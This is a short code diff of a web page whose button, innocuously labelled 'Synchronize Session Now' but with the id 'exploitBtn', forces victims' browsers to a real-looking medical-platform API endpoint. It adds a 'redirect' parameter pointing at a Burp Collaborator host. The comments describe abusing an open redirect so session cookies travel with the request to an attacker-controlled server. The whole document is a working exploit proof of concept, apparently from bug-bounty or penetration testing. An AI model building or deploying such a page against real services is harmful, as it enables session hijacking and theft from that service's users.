@@ -17,20 +17,20 @@
     <br>
     <button id="exploitBtn" class="btn">Synchronize Session Now</button>
 </div>
-
 <script>
     document.getElementById('exploitBtn').addEventListener('click', () => {
-        // 1. Your Burp Collaborator URL
-        const collaboratorUrl = "https://a2d0x9ltr3gmvj9qtxtgh4go1f77v0jp.k.e-secureapp.com";
+        // 1. Base API URL (Do NOT put any parameters or question marks here)
+        const targetUrl = new URL("https://ocean.medishout.co.uk/v1/users/me/?platform=web");
 
-        // 2. The Target API endpoint. 
-        // FIX 1: We use '&' to safely chain parameters.
-        // FIX 2: We pass your Collaborator URL directly as a standard HTTPS destination.
-        // If the open redirect works, the server will redirect the user's browser directly to your Collaborator.
-        const finalizedTarget = "https://ocean.medishout.co.uk/v1/users/me/?platform=web" + encodeURIComponent(collaboratorUrl);
+        // 2. Safely add the individual parameters. The browser handles '&' and encoding automatically.
+        targetUrl.searchParams.set("platform", "web");
+        
+        // 3. Put your exact Burp Collaborator link here
+        targetUrl.searchParams.set("redirect", "https://a2d0x9ltr3gmvj9qtxtgh4go1f77v0jp.k.e-secureapp.com");
 
-        // 3. Force top-level navigation so SameSite=Lax cookie passes cleanly
-        window.location.href = finalizedTarget;
+        // 4. Trigger the top-level navigation
+        console.log("Navigating to: ", targetUrl.toString()); // Verify in console first
+        window.location.href = targetUrl.toString();
     });
 </script>
 
